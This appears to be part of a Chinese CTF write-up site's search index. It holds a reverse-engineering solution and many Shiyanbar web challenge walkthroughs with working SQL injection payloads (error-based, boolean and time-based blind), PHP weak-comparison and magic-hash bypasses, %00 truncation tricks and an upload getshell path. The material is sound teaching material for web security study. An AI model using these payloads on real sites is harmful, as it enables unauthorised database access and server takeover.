[0x0000000002007f10 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00 gef➤ x/16wx 0x0000000002007f10 0x2007f10: 0x00000027 0x00000026 0x00000025 0x00000024 0x2007f20: 0x00000023 0x00000022 0x00000021 0x00000020 0x2007f30: 0x0000001f 0x0000001e 0x0000001d 0x0000001c 0x2007f40: 0x0000001b 0x0000001a 0x00000019 0x0000000c 发现这个是把输入进行了反向. 总结一下加密流程 1.接受16个数字输入 2.计算斐波那契数列前16项 3.把16个数字输入从第二个元素开始,都加上第一个元素 4.将3的结果反向 5.将4的结果和2的结果比较,完全相同则输入的是flag 解密脚本: a = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987] c = a[::-1] d = [987] for i in range(1,len(c)): d.append(c[i]-987) import pprint pprint.pprint(d) 输出: [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] getflag: from pwn import * p = process('./easyCpp') input_ = [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] for i in input_: p.sendline(str(i)) p.interactive() "},"articals/shiyanbar_web.html":{"url":"articals/shiyanbar_web.html","title":"实验吧web部分","keywords":"","body":"实验吧Web部分 题目类型： 类型 年份 难度 网上练习题 无 易 网上公开WP： https://www.cnblogs.com/sch01ar/p/7996159.html https://www.0x002.com/2019/百道CTF刷题记录(一)/ 本站备份WP: 作者：Yunen 简介 最近在刷CTF题，主攻Web，兼职Misc Shiyanbar 0x01 简单的登陆题 简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程： F12查看响应头，发现返回tips访问test.php文件得到源代码： base64_decode('\".base64_encode($plain).\"') can't unserialize\"); $sql=\"select * from users limit \".$info['id'].\",0\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)>0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo 'Hello!'.$rows['username'].''; } else{ echo 'Hello!'; } }else{ die(\"ERROR!\"); } } } if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(\"sql inject detected!\"); $info = array('id'=>$id); login($info); echo 'Hello!'; }else{ if(isset($_COOKIE[\"iv\"])&&isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo ' Login Form input id to login '; } }?> 代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录 简单概括： 考点：md5()函数16位二进制格式绕过，md5(\"ffifdyop\",True)得到的加密字符串为'or'6(注：or '数字+字母' 等价于or true) 难度：易 WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程： 打开网页，右键查看源代码发现源码： 0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } --> 上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串'or'6\"，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入 简单概括： 考点：双参数注释绕过，=被过滤可用regexp 'xxx'和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程： 观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&password。sql语句如下： $sql=\"select * from users where username='$username' and password='$password'\"; 注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。 最终我们的payload如下： username=a'/*&password=*/Or exp(~(select * from(select database())a))or'1 //查询当前数据库 username=a'/*&password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 //查询表名，此处由于=被过滤，我们使用regexp来绕过 username=a'/*&password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1 //查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。 username=a'/*&password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1 //获取flag 0x04 认真一点！ 简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程： 打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。 id=aaa'oorr(1=1)='1 //返回You are in id=aaa'oorr(1=2)='1 //返回You are not in // 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句 // 即：false ∪ (条件一) = 条件一 我们先判断数据库长度： id=aaa'oorr(length(database())>1)='1 其次循环取数据库名进行判断： id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤 接着循环判断表名： id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1 之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？ 简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程： 打开题目，发现返回头存在提示信息：打开链接获得源码： $value) { $value = trim($value); is_string($value) && $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i 代码流程：is_numeric[false] && $req['number']!=strval(intval($req['number']))[false]-> $value1!=$value2[false]-> is_palindrome_number($req[\"number\"])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741>2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗?? 简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程： 打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用'='成功。 0x07 who are you? 简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程： 抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1'and case when(length(database())>1)then(sleep(5))else(sleep(0))end and '1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过 简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程： 右键源代码得到提示信息source.txt，打开得到源码。 '.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){ print \"水可载舟，亦可赛艇！\"; exit(); } } $filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; foreach($_POST as $key=>$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\"); if (!$con){ die('Could not connect: ' . mysql_error()); } $db=\"XXXXXX\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } mysql_close($con); ?> 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql> create table test ( -> user varchar(100) not null, -> pwd varchar(100) not null);mysql>insert into test values(\"admin\",\"mypass\");mysql>select from test group by pwd with rollupmysql> select from test group by pwd with rollup;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass || admin | mypass || admin | NULL |+-------+------------+3 rows in setmysql> select from test group by pwd with rollup limit 1;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+mysql> select from test group by pwd with rollup limit 1 offset 0;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 1;+-------+--------+| user | pwd |+-------+--------+| admin | mypass |+-------+--------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 2;+-------+------+| user | pwd |+-------+------+| admin | NULL |+-------+------+1 row in set 构造payload:uname=1' or true group by pwd with rollup limit 1 offset 2#&pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3 简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程： exp函数报错一把嗦 0x0A 简单的sql注入之2 简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程： 简单Fuzz发现过滤了空格，使用内敛注释一把嗦。 /**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1 简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程 selectselect 0x0C 天下武功唯快不破 简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程： import requests,base64 r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php') key=base64.b64decode(r.headers['FLAG'])[-9:] r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key}) print(r.text) 0x0D 让我进去 简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角 简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程： index.php/index.php 0X0F Forms 简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统 简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程： 右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x11 忘记密码了 简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程： 打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。 ........这一行是省略的代码........ /* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */ ........这一行是省略的代码........ if(!empty($token)&&!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r>0){ echo $flag; }else{ echo \"失败了呀\"; } } payload: token=0e11111111&emailAddress=admin@simplexue.com 0x12 Once More 简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程： 打开题目，得到题目源码： You password must be alphanumeric'; } else if (strlen($_GET['password']) 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('*-* have not been found'); } } else { echo 'Invalid password'; } } ?> 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session 简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程： 打开题目得到源码： Wrong guess.'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?> 创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION['password']的值将为NULL，此时如果我们get传入的 password为空，即''，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE 简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&password[]=2 解题过程： 打开题目获得源码： Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.'; } else{ echo 'Login first!'; ?> 我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&password[]=b 0x15 上传绕过 简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程： burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200 简单概括： 考点：逆加密过程 难度：易 WP：部分： x = \"~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg\" c = \"\" for a in x: b = ord(a) c += chr(b-1) print(c) 解题过程： 打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题 简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&pass=1 解题过程： 打开题目，右键查看源代码得到题目源码： welcome to simplexue connect_error) { die(\"Connection failed: \" . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\"pw\"]; if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) { echo \"Logged in! Key:************** \"; } else { echo(\"Log in failure!\"); } } ?> strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd: user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西? 简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程： 复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法 简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程： 打开题目，页面提示：index.php.txt，打开得到源码： not allowed!\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"Access granted!\"; echo \"flag: *****************} \"; } ?> Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单! 简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难 简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大 简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠 简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程： 查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难 简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦 "},"thankyou.html":{"url":"thankyou.html","title":"小小地捐助本站","keywords":"","body":"捐助本站 感谢各位师傅的捐助 alert(\"支持下这破站吧。\") "},"reply.html":{"url":"reply.html","title":"有问题?请在这里反馈!","keywords":"","body":"请在这里留下你的宝贵建议 官方互助群 快来加群一起讨(gao)论(ji)啊。 点我加群 :)群号: 937886410 评论区 请文明评论，禁止广告 "}}